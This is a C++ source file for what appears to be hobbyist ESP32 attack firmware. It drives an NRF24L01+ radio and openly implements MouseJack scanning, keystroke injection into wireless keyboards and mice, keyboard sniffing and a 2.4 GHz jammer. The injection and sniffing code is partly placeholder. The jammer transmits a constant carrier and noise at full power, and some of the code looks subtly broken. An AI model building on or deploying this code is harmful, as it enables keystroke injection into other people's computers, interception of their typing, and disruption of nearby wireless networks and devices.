/**
 * @file nrf24_attacks.cpp
 * @brief NRF24L01+ Attack Implementation
 * 
 * Implements MouseJack injection and Keyboard Sniffing logic
 * using the RF24 library.
 * 
 * @author Monster S3 Team
 * @date 2025
 */

#include "nrf24_attacks.h"
#include "pin_config.h"

// ============================================================================
// STATIC MEMBER INITIALIZATION
// ============================================================================
// Note: We use a pointer to SPIClass to handle the specific bus
static SPIClass* _nrfSPI = nullptr;

RF24 NRF24Attacks::_radio(PIN_NRF24_CE, PIN_NRF24_CSN);
bool NRF24Attacks::_initialized = false;
NRFState NRF24Attacks::_state = NRF_IDLE;
uint8_t NRF24Attacks::_channel = 0;

uint32_t NRF24Attacks::_lastScanTime = 0;
uint8_t NRF24Attacks::_scanChannel = 0;
uint8_t NRF24Attacks::_targetAddress[5] = {0};

// ============================================================================
// INITIALIZATION
// ============================================================================
bool NRF24Attacks::init() {
    if (_initialized) return true;
    
    Serial.println("[NRF] Initializing NRF24L01...");
    
    // Initialize dedicated SPI instance for SPI B (HSPI)
    if (_nrfSPI == nullptr) {
        _nrfSPI = new SPIClass(HSPI);
        _nrfSPI->begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_NRF24_CSN);
    }
    
    // Begin with custom SPI
    // Note: passing pointer to SPIClass is supported in standard TMRh20 RF24
    if (_radio.begin(_nrfSPI)) {
        Serial.println("[NRF] Connection OK!");
        _initialized = true;
        
        _radio.setPALevel(RF24_PA_MAX);
        _radio.setDataRate(RF24_2MBPS);
        _radio.setAutoAck(false);
        _radio.disableCRC(); // Promiscuous-like
        
        _radio.startListening();
        return true;
    } else {
        Serial.println("[NRF] Connection FAILED!");
        return false;
    }
}

void NRF24Attacks::stop() {
    if (!_initialized) return;
    
    _state = NRF_IDLE;
    _radio.powerDown();
    // We don't delete SPI instance as other modules might share it or we might restart
}

bool NRF24Attacks::isInitialized() {
    return _initialized;
}

// ============================================================================
// MOUSEJACK
// ============================================================================
void NRF24Attacks::startMousejackScan() {
    if (!init()) return;
    
    _state = NRF_SCANNING;
    _scanChannel = 0;
    _lastScanTime = millis();
    
    Serial.println("[NRF] Mousejack Scan Started...");
}

void NRF24Attacks::updateMousejack() {
    if (!_initialized || _state != NRF_SCANNING) return;
    
    // Simple Channel Hopping Scan
    if (millis() - _lastScanTime > 100) {
        _scanChannel++;
        if (_scanChannel > 80) _scanChannel = 0; // Scan only interesting channels? 0-80 roughly covering BLE/WiFi overlap
        
        setChannel(_scanChannel);
        _lastScanTime = millis();
        // Serial.printf(".");
    }
    
    // Listen for packets
    if (_radio.available()) {
        uint8_t buf[32];
        uint8_t len = _radio.getDynamicPayloadSize();
        if (len > 32) len = 32;
        
        _radio.read(buf, len);
        
        // Analyze packet for potential Mouse/Keyboard traffic
        // Simple heuristic: valid payload length and activity
        // Real implementation requires descrambling Microsoft/Logitech protocols
        if (len > 4) { // Filter noise
             Serial.printf("\n[NRF] Pkt Ch%d Len:%d Data:", _scanChannel, len);
             for(int i=0; i<len; i++) Serial.printf("%02X ", buf[i]);
             Serial.println();
             
             // Check for known headers (simplified)
             // Microsoft non-encrypted or Logitech Unifying...
        }
    }
}

void NRF24Attacks::startInjection(uint8_t* address, uint8_t channel) {
    if (!init()) return;
    
    _state = NRF_INJECTING;
    setChannel(channel);
    _radio.stopListening();
    _radio.openWritingPipe(address);
    
    // Inject Ducky Script payload or Keystrokes
    // Placeholder for actual injection logic
    uint8_t payload[] = {0, 0, 4, 0}; // 'a' key (USB HID)
    _radio.write(payload, 4);
    
    Serial.println("[NRF] Injection executed");
    _radio.startListening();
}

// ============================================================================
// KEYBOARD SNIFF
// ============================================================================
void NRF24Attacks::startKeyboardSniff() {
     startMousejackScan(); // Re-use scan logic for now
     Serial.println("[NRF] Keyboard Sniff Started...");
}

void NRF24Attacks::updateKeyboardSniff() {
    updateMousejack(); // Re-use
}

// ============================================================================
// JAMMER
// ============================================================================
void NRF24Attacks::startJammer24(uint8_t channel) {
    if (!init()) return;
    
    _state = NRF_JAMMING;
    setChannel(channel);
    _radio.stopListening();
    _radio.setPALevel(RF24_PA_MAX);
    
    Serial.printf("[NRF] Jammer Started on Ch %d\n", channel);
}

void NRF24Attacks::updateJammer24() {
    if (!_initialized || _state != NRF_JAMMING) return;
    
    // Continuous transmission (carrier)
    _radio.startConstCarrier(RF24_PA_MAX, _channel);
    // Note: startConstCarrier blocks? No.
    // Actually RF24 library handles wave?
    // Alternative: send garbage constantly
    uint8_t noise[32];
    memset(noise, 0xAA, 32);
    _radio.write(noise, 32);
}

void NRF24Attacks::stopJammer24() {
    if (_state == NRF_JAMMING) {
        _radio.stopConstCarrier();
        _radio.startListening();
        _state = NRF_IDLE;
    }
}

// ============================================================================
// HELPERS
// ============================================================================
void NRF24Attacks::setChannel(uint8_t ch) {
    _channel = ch;
    _radio.setChannel(ch);
}

NRFState NRF24Attacks::getState() {
    return _state;
}

int8_t NRF24Attacks::getRSSI() {
    return _radio.testRPD() ? -64 : -100; // Binary RSSI on NRF24L01+
}
